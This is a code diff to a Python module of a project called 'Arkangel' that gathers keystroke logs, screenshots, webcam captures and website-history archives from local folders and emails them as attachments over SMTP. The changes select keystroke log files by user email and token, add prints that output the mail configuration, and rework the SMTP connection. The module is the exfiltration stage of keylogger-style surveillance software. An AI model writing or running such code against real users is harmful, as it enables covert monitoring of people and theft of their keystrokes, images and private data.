@@ -9,7 +9,8 @@ from datetime import datetime
 uid = getCurrentUser()
 conf = getRowValue('Email',uid)
 deli = getRowValue('EmailDelivery',uid)
-
+print(conf)
+print(deli)
 def DelSentLogs(files):
     for f in files:
         if(os.path.exists(f)):
@@ -46,30 +47,32 @@ msg['To'] = toaddr
 msg['Subject'] = deli[6]
  
 # string to store the body of the mail
-body = "Message from Arkangel!!"
+body = 'Message from Arkangel!! \nTime: ' + datetime.now().strftime('%Y_%m_%d-%H_%M_%S')
  
 # attach the body with the msg instance
 msg.attach(MIMEText(body, 'plain'))
 
-keystrokeLogs = datetime.now().strftime('%Y_%m_%d')+'.txt'
+email = getRowValue('Users',uid)[1]
+token = getRowValue('current_user',uid)[1]
+#keystrokeLogs = datetime.now().strftime('%Y_%m_%d-')+email+'-'+token+'.txt'
+
 dir_path = getRowValue('Setting',uid) # thu muc chua file can gui
 
 # cac file can gui
 files = []
 if (conf[4] == 1):
-    files.append(os.path.join(dir_path[1],keystrokeLogs))
+    for file in os.listdir(dir_path[1]):
+        if file.endswith(email+'-'+token+".txt"):
+            filePath = os.path.join(dir_path[1], file)
+            print(filePath)
+            files.append(filePath)
 if (conf[5] == 1):
     files.append(os.path.join(dir_path[3],"Screenshot.zip"))
 if (conf[6] == 1):
     files.append(os.path.join(dir_path[2],"Webcam.zip"))
 if (conf[7] == 1):
     files.append(os.path.join(dir_path[5],"Website.zip"))
-'''
-files = [os.path.join(dir_path[2],"Webcam.zip"),
-         os.path.join(dir_path[3],"Screenshot.zip"),
-         os.path.join(dir_path[1],keystrokeLogs),
-         os.path.join(dir_path[5],"Website.zip")]
-'''
+
 for f in files:  # add files to the message
     if (os.path.exists(f)):
         attachment = MIMEApplication(open(f, "rb").read(), _subtype="txt")
@@ -78,13 +81,19 @@ for f in files:  # add files to the message
         print("Attach " +str(f)+" sucessful!")
     else:
         print(str(f) + " does not exists!!!")
+        
 # creates SMTP session
 smtp = deli[2]
 port = deli[3]
-s = smtplib.SMTP(smtp, port)
- 
+
+s = smtplib.SMTP(smtp, 25)
+#s = smtplib.SMTP(smtp, port)
+s.connect(smtp,port)
+s.ehlo()
 # start TLS for security
 s.starttls()
+s.ehlo()
+
  
 # Authentication
 pwd = deli[5]
@@ -92,6 +101,7 @@ s.login(fromaddr, pwd)
  
 # Converts the Multipart msg into a string
 text = msg.as_string()
+
 try:
     success = 0
     if(enSize == 1 and TotalFileSize(files) > size):
